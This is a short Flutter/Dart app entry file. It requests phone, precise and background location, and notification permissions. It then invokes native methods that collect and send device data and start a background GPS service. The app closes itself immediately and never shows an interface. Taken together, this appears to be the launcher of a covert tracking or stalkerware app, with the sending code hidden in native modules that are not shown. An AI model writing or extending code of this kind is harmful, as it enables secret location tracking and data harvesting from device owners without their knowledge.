import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:permission_handler/permission_handler.dart';

const deviceChannel = MethodChannel('device_collector');
const serviceChannel = MethodChannel('background_service');

Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();

  // Request permissions
  final phoneStatus = await Permission.phone.request();
  final locationStatus = await Permission.location.request();
  final backgroundStatus = await Permission.locationAlways.request();
  await Permission.notification.request();

  // Collect and send device info (now handled in native code)
  if (phoneStatus.isGranted) {
    try {
      await deviceChannel.invokeMethod('collectAndSendDeviceData');
      print("Device data collection initiated");
    } catch (e) {
      print("Error collecting device data: $e");
    }
  }

  // Start location service
  if (locationStatus.isGranted && backgroundStatus.isGranted) {
    try {
      await serviceChannel.invokeMethod('startService');
      print("Background GPS service started");
    } catch (e) {
      print("Error starting background service: $e");
    }
  } else {
    print("Location permissions not granted");
  }

  SystemNavigator.pop();
}